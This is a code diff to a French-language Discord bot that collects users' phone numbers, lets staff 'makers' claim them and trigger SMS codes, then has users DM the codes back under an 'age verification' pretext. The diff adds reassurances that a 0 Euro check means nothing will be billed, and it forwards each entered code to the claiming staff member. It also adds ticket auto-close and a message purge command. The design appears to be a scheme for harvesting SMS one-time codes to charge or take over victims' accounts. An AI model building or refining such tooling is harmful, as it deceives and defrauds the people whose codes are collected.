@@ -21,6 +21,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 cooldowns: Dict[int, float] = {}
 pending_verifications: Dict[int, dict] = {}
+staff_active_claims: Dict[int, dict] = {}
 
 async def health_handler(request):
     return web.Response(text="OK", status=200)
@@ -93,7 +94,35 @@ class StaffPanelView(discord.ui.View):
         self.phone = phone
         self.claimed_by: Optional[int] = None
         self.code_requested = False
+        self.closed = False
         self.message: Optional[discord.Message] = None
+        self.auto_close_task: Optional[asyncio.Task] = None
+
+    async def close_ticket(self, status_text: str = "Ferme"):
+        pending_verifications.pop(self.user_id, None)
+        cooldowns.pop(self.user_id, None)
+        if self.claimed_by and self.claimed_by in staff_active_claims:
+            staff_active_claims.pop(self.claimed_by, None)
+        self.closed = True
+        if self.auto_close_task:
+            self.auto_close_task.cancel()
+            self.auto_close_task = None
+        for child in self.children:
+            if isinstance(child, discord.ui.Button):
+                child.disabled = True
+        try:
+            user_fetch = await bot.fetch_user(self.user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status=status_text, claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=self.message.created_at if self.message else None)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            new_embed.color = 0xed4245
+            await self.message.edit(embed=new_embed, view=self)
+        except:
+            pass
+
+    async def start_auto_close(self):
+        await asyncio.sleep(300)
+        if not self.closed and not self.code_requested and self.claimed_by is not None:
+            await self.close_ticket("Ferme automatiquement (5 min)")
 
     @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
     async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -101,13 +130,27 @@ class StaffPanelView(discord.ui.View):
             embed = discord.Embed(title="Deja pris", description=f"Un maker est deja sur le coup (<@{self.claimed_by}>).", color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        self.claimed_by = interaction.user.id
+        if self.closed:
+            embed = discord.Embed(title="Ferme", description="Cette verification est deja fermee.", color=0xed4245)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        staff_id = interaction.user.id
+        if staff_id in staff_active_claims:
+            old_data = staff_active_claims[staff_id]
+            try:
+                old_view = old_data["view"]
+                await old_view.close_ticket("Ferme (nouveau claim)")
+            except:
+                pass
+        staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
+        self.claimed_by = staff_id
         embed_reveal = discord.Embed(title="Numero debloque", description=f"```\n{self.phone}\n```\nNe partagez pas ce numero.", color=0x57f287, timestamp=datetime.datetime.now())
         await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
         user_fetch = await bot.fetch_user(self.user_id)
         new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
         await interaction.message.edit(embed=new_embed, view=self)
+        self.auto_close_task = asyncio.create_task(self.start_auto_close())
 
     @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.success, custom_id="request_code_btn")
     async def request_code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -123,6 +166,13 @@ class StaffPanelView(discord.ui.View):
             embed = discord.Embed(title="Deja demande", description="Le code a deja ete demande a cet utilisateur.", color=0xfee75c)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
+        if self.closed:
+            embed = discord.Embed(title="Ferme", description="Cette verification est fermee.", color=0xed4245)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        if self.auto_close_task:
+            self.auto_close_task.cancel()
+            self.auto_close_task = None
         self.code_requested = True
         pending_verifications[self.user_id] = {
             "phone": self.phone,
@@ -139,7 +189,7 @@ class StaffPanelView(discord.ui.View):
             user = await bot.fetch_user(self.user_id)
             embed_dm = discord.Embed(
                 title="Code de verification",
-                description="Vous allez recevoir un code de verification par SMS.\n\nVous serez debite de 0 Euro.\nCeci est une simple verification pour confirmer votre majorite.\n\nUne fois le code recu, repondez a ce message avec le code a 4 chiffres.",
+                description="N'ayez pas peur, c'est une simple verification pour prouver votre age.\n\nComme quand on relie une carte bancaire a PayPal, un prelevement de 0 Euro est effectue pour verifier que le compte est valide.\n\nAucun debit ne sera fait sur votre facture telephone. Le SMS recu est juste un code de confirmation.\n\nUne fois le code recu, repondez a ce message avec le code a 4 chiffres.",
                 color=0x5865f2
             )
             embed_dm.set_footer(text="Repondez avec le code • 0,00 Euro")
@@ -151,7 +201,7 @@ class StaffPanelView(discord.ui.View):
             self.code_requested = False
             return
         user_fetch = await bot.fetch_user(self.user_id)
-        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demande en cours", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
+        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demande - en attente", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
         await interaction.message.edit(embed=new_embed, view=self)
 
@@ -161,16 +211,13 @@ class StaffPanelView(discord.ui.View):
             embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut fermer cette verification.", color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        pending_verifications.pop(self.user_id, None)
-        cooldowns.pop(self.user_id, None)
-        for child in self.children:
-            if isinstance(child, discord.ui.Button):
-                child.disabled = True
-        user_fetch = await bot.fetch_user(self.user_id)
-        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Ferme", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
-        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
-        new_embed.color = 0xed4245
-        await interaction.response.edit_message(embed=new_embed, view=self)
+        if self.closed:
+            embed = discord.Embed(title="Deja ferme", description="Cette verification est deja fermee.", color=0xfee75c)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        await self.close_ticket("Ferme")
+        embed = discord.Embed(title="Verification fermee", color=0xed4245)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
 async def send_staff_panel(user: discord.User, phone: str):
     guild = bot.get_guild(config.STAFF_GUILD_ID)
@@ -191,6 +238,12 @@ async def handle_dm_code(message: discord.Message):
     user_id = message.author.id
     pending = pending_verifications.get(user_id)
     if pending is None:
+        embed = discord.Embed(
+            title="Verification expiree",
+            description="Cette verification a expire. Vous devez refaire une demande pour recevoir un nouveau code.\n\nVeuillez contacter le staff pour relancer le processus.",
+            color=0xed4245
+        )
+        await message.channel.send(embed=embed)
         return
     content = message.content.strip()
     valid, err_msg = validate_code(content)
@@ -203,11 +256,27 @@ async def handle_dm_code(message: discord.Message):
     pending_verifications.pop(user_id, None)
     embed_success = discord.Embed(title="Verification reussie", description="Votre numero de telephone a ete verifie avec succes.\nAcces autorise.", color=0x57f287)
     await message.channel.send(embed=embed_success)
+    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
+    if validation_channel:
+        embed_val = discord.Embed(
+            title="CODE VALIDE",
+            description=f"**Code : `{content}`**",
+            color=0x57f287,
+            timestamp=datetime.datetime.now()
+        )
+        embed_val.add_field(name="Staff", value=f"<@{claimed_by}>", inline=True)
+        embed_val.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
+        embed_val.add_field(name="Numero", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
+        embed_val.add_field(name="Code saisi", value=f"`{content}`", inline=True)
+        embed_val.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
+        embed_val.set_thumbnail(url=message.author.display_avatar.url)
+        embed_val.set_footer(text="Validation de verification")
+        await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val)
     log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
     if log_channel:
         embed_log = discord.Embed(
             title="CODE VALIDE",
-            description=f"Un staff a valide un code de verification.",
+            description="Code valide par un utilisateur.",
             color=0x57f287,
             timestamp=datetime.datetime.now()
         )
@@ -217,7 +286,7 @@ async def handle_dm_code(message: discord.Message):
         embed_log.add_field(name="Code", value=f"`{content}`", inline=True)
         embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
         embed_log.set_thumbnail(url=message.author.display_avatar.url)
-        embed_log.set_footer(text="Validation de verification")
+        embed_log.set_footer(text="Logs de verification")
         await log_channel.send(embed=embed_log)
     if config.VERIFIED_ROLE_ID and config.GUILD_ID:
         guild = bot.get_guild(config.GUILD_ID)
@@ -273,6 +342,25 @@ async def setup(interaction: discord.Interaction):
     view.add_item(VerifyButton())
     await interaction.response.send_message(embed=embed, view=view)
     log.info(f"Setup fait dans #{interaction.channel.name}")
+
+@bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
+@app_commands.default_permissions(administrator=True)
+@app_commands.describe(nombre="Nombre de messages a supprimer")
+async def clear(interaction: discord.Interaction, nombre: int):
+    if nombre < 1 or nombre > 100:
+        embed = discord.Embed(title="Nombre invalide", description="Choisissez un nombre entre 1 et 100.", color=0xfee75c)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    await interaction.response.defer(ephemeral=True)
+    deleted = await interaction.channel.purge(limit=nombre)
+    embed = discord.Embed(title="Salon nettoye", description=f"{len(deleted)} messages supprimes.", color=0x57f287)
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="ping", description="Affiche la latence du bot")
+async def ping(interaction: discord.Interaction):
+    latency = round(bot.latency * 1000)
+    embed = discord.Embed(title="Pong", description=f"Latence : {latency}ms", color=0x57f287)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 @bot.tree.command(name="sync", description="Sync les commandes slash")
 @app_commands.default_permissions(administrator=True)
